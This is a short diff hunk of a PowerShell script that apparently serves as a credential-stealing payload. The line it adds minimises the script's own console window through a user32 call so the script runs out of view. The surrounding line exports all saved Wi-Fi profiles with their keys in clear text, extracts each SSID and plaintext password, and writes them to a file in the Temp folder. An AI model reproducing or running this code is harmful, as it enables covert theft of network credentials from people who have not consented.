@@ -1,4 +1,5 @@
 
+powershell -command "(Get-Process -Id $pid).MainWindowHandle | ForEach-Object { (New-Object -TypeName psobject -Property @{HWND=$_}) } | ForEach-Object { (Add-Type '[DllImport(\"user32.dll\")]public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);' -Name 'Win32ShowWindowAsync' -PassThru)::ShowWindowAsync($_.HWND, 2) }"
 
 
 $e="$env:LOCALAPPDATA\Temp"; netsh wlan export profile key=clear folder=$e | Out-Null; Get-ChildItem "$e\Wi-Fi*.xml" | %{$x=[xml](gc $_); "SSID:$($x.WLANProfile.SSIDConfig.SSID.name) | Password:$($x.WLANProfile.MSM.security.sharedKey.keyMaterial)"} > "$e\wifi.txt"
